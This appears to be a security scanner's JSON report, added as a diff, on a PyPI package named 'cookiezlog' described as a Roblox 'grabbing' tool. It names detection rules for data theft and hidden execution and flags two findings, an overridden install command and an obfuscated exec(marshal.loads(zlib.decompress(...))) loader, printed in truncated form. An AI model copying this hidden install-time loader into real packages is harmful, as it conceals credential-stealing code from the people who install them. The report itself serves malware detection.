@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:41",
+                "code": "setup(\n    name='cookiezlog',\n    version='0.0.1',\n    description='Extra Package for Roblox grabbing',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[]...\n    },\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": {},
+        "exec-base64": [
+            {
+                "location": "setup.py:27",
+                "code": "   import marshal,zlib;exec(marshal.loads(zlib.decompress(b'x\\x9cM\\x90\\xc1J\\xc3@\\x10\\x86\\xeb\\xb5O\\xb1\\xec)\\x01\\xd9\\xdd4I\\x93\\x08=\\x84\\xe0A\\xa8(\\xa1\\x1e<\\x85\\x98\\x0c6hv\\xd7\\x9d\\x89U\\xf0e}\\x13\\xd7\\xd0B\\x86\\xb9\\xcc\\xcf\\xfc\\xf3\\xfd\\xccoz\\xb5Z1_...xa9`;')))\n",
+                "message": "This package contains a call to the `eval` function with a `base64` encoded string as argument.\nThis is a common method used to hide a malicious payload in a module as static analysis will not decode the\nstring.\n"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/cookiezlog-0.0.1"
+}
